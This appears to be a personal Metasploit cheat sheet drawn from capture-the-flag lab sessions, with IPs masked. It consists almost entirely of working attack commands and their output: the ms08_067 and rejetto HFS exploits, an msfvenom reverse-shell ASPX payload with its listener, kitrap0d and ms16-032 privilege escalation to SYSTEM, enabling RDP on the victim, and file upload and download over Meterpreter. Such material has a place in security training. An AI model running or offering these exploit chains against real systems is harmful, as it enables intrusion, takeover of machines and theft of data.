Metasploit
----------



#Start Metasploit
sudo msfconsole 



#When a vulnerability is suppored by Metasploit
#This will create its own connect back shell run the exploit and start a meterpreter session

msf5 > use exploit/windows/smb/ms08_067_netapi
msf5 exploit(windows/smb/ms08_067_netapi) > set RHOST x.x.x.x
RHOST => x.x.x.x
msf5 exploit(windows/smb/ms08_067_netapi) > check
[+] x.x.x.x:445 - The target is vulnerable.
msf5 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on x.x.x.x:4444
[*] x.x.x.x:445 - Automatically detecting the target...
[*] x.x.x.x:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] x.x.x.x:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] x.x.x.x:445 - Attempting to trigger the vulnerability...
[*] Sending stage (180291 bytes) to x.x.x.x
[*] Meterpreter session 1 opened (x.x.x.x:4444 -> x.x.x.x:1032) at 2019-10-26 18:57:59 +0000



#Once connected and elevated on the Blue Host(Victim) enable RDP(Remote Desktop Protocol) via meterpreter
meterpreter > run getgui -u user -p password



#List Process once connected with a shell using meterpreter
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User             Path
 ---   ----  ----                  ----  -------  ----             ----
 0     0     [System Process]                                      
 4     0     System                                                
 264   4     smss.exe 
 3820  1564  w3wp.exe              x86   0        IIS APPPOOL\Web  c:\windows\system32\inetsrv\w3wp.exe



#Migrate the meterpreter pid to another once connected (requires Token on windows)
meterpreter > migrate 3820
[-] Process already running at PID 3820



#Create a reverse shell for use in a webframe work
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f aspx > devel1.aspx

use multi/handle
set payload windows/meterpreter/reverse_tcp
set LHOST x.x.x.x
set RPORT 4444
set ExitOnSession false
exploit -j



#Check meterpreter session against supported local exploits in metasploit once conected
meterpreter > background


#Run session against available metasploit exploits
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > sessions

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  2         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  x.x.x.x:4444 -> x.x.x.x:49160 (x.x.x.x)


msf5 post(multi/recon/local_exploit_suggester) > set session 2
session => 2
msf5 post(multi/recon/local_exploit_suggester) > run

[*] x.x.x.x - Collecting local exploits for x86/windows...
[*] x.x.x.x - 29 exploit checks are being tried...
[+] x.x.x.x - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] x.x.x.x - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] x.x.x.x - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] x.x.x.x - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] x.x.x.x - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] x.x.x.x - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] x.x.x.x - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
[+] x.x.x.x - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] x.x.x.x - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] x.x.x.x - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] x.x.x.x - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] x.x.x.x - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] x.x.x.x - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed



msf5 exploit(windows/local/ms10_015_kitrap0d) > sessions

Active sessions
===============

  Id  Name  Type                     Information  Connection
  --  ----  ----                     -----------  ----------
  3         meterpreter x86/windows               x.x.x.x:4444 -> x.x.x.x:49161 (x.x.x.x)

msf5 exploit(windows/local/ms10_015_kitrap0d) > use exploit/windows/local/ms10_015_kitrap0d
msf5 exploit(windows/local/ms10_015_kitrap0d) > set session 3
session => 3
msf5 exploit(windows/local/ms10_015_kitrap0d) > set lhost tun0
lhost => tun0
msf5 exploit(windows/local/ms10_015_kitrap0d) > set lhost 1234
lhost => 1234
msf5 exploit(windows/local/ms10_015_kitrap0d) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on x.x.x.x:1234 
msf5 exploit(windows/local/ms10_015_kitrap0d) > [*] Launching notepad to host the exploit...
[+] Process 3828 launched.
[*] Reflectively injecting the exploit DLL into 3828...
[*] Injecting exploit into 3828 ...
[*] Exploit injected. Injecting payload into 3828...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (180291 bytes) to x.x.x.x
[*] Meterpreter session 5 opened (x.x.x.x:1234 -> x.x.x.x:49158) at 2019-10-26 21:02:49 +0000

msf5 exploit(windows/local/ms10_015_kitrap0d) > sessions

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  4         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL      x.x.x.x:4444 -> x.x.x.x:49157 (x.x.x.x)
  5         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DEVEL  x.x.x.x:1234 -> x.x.x.x:49158 (x.x.x.x)



#Interact with meterpreter sessions
msf5 exploit(windows/local/ms10_015_kitrap0d) > sessions -i 5
[*] Starting interaction with 5...



meterpreter >


#Run Metasploit exploit against Blue Team (Victim)
msf5 exploit(windows/local/ms10_015_kitrap0d) > use exploit/windows/http/rejetto_hfs_exec

msf5 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     x.x.x.x          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    x.x.x.x          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     50000            yes       The listen address (an interface may be specified)
   LPORT     51000            yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOST x.x.x.x
RHOST => x.x.x.x
msf5 exploit(windows/http/rejetto_hfs_exec) > set LHOST x.x.x.x
LHOST => x.x.x.x
msf5 exploit(windows/http/rejetto_hfs_exec) > set LPORT 51000
LPORT => 51000
msf5 exploit(windows/http/rejetto_hfs_exec) > set SRVHOST x.x.x.x
SRVHOST => x.x.x.x
msf5 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on x.x.x.x:51000 
[*] Using URL: http://x.x.x.x:8080/2gDwRKqDt
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /2gDwRKqDt
[*] Sending stage (180291 bytes) to x.x.x.x
[*] Meterpreter session 12 opened (x.x.x.x:51000 -> x.x.x.x:49162) at 2019-10-26 22:46:57 +0000


#Use a x86_64 reverse shell in a Windows exploit
msf5 exploit(windows/http/rejetto_hfs_exec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/http/rejetto_hfs_exec) > set LPORT 51001
LPORT => 51001
msf5 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on x.x.x.x:51001 
[*] Using URL: http://x.x.x.x:51000/rWRkgYT0MR
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /rWRkgYT0MR
[*] Sending stage (206403 bytes) to x.x.x.x
[*] Meterpreter session 2 opened (x.x.x.x:51001 -> x.x.x.x:49189) at 2019-10-26 23:15:25 +0000

[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\HBBRQWfSLR.vbs' on the target

meterpreter > 
meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > 

meterpreter > background
[*] Backgrounding session 3...

msf5 exploit(windows/http/rejetto_hfs_exec) > use post/multi/recon/local_exploit_suggester

msf5 post(multi/recon/local_exploit_suggester) > set session 3
session => 3
msf5 post(multi/recon/local_exploit_suggester) > run

[*] x.x.x.x - Collecting local exploits for x64/windows...


#Manually locate exaploit and run it
msf5 post(multi/recon/local_exploit_suggester) > search ms16-032

Matching Modules
================

   #  Name                                                           Disclosure Date  Rank    Check  Description
   -  ----                                                           ---------------  ----    -----  -----------
   0  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  2016-03-21       normal  Yes    MS16-032 Secondary Logon Handle Privilege Escalation


msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc

msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set sessions 3
sessions => 3
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set payload windows/x64/meterpreter/reverse_Tcp
[-] The value specified for payload is not valid.
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST x.x.x.x
LHOST => x.x.x.x
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LPORT 51003
LPORT => 51003
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows x86
   1   Windows x64


msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run



#Save Windows systeminfo for searching exploits
meterpreter > execute -f "cmd.exe /c systeminfo > systeminfo.txt"
Process 2284 created.



#Download file from meterpreter session
meterpreter > download systeminfo.txt
[*] Downloading: systeminfo.txt -> systeminfo.txt
[*] Downloaded 3.26 KiB of 3.26 KiB (100.0%): systeminfo.txt -> systeminfo.txt
[*] download   : systeminfo.txt -> systeminfo.txt



#Upload file to meterpreter host
meterpreter > upload 41020.exe
[*] uploading  : 41020.exe -> 41020.exe
[*] Uploaded 547.00 KiB of 547.00 KiB (100.0%): 41020.exe -> 41020.exe
[*] uploaded   : 41020.exe -> 41020.exe